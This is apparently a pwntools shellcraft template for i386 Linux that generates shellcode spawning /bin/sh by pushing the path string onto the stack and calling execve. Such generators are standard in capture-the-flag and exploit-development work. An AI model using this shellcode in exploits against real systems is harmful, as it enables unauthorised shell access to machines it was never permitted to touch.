<% from pwnlib.shellcraft import i386 %>
<%docstring>Execute /bin/sh</%docstring>

${i386.pushstr('/bin///sh')}

${i386.linux.syscall('SYS_execve', 'esp', 0, 0)}
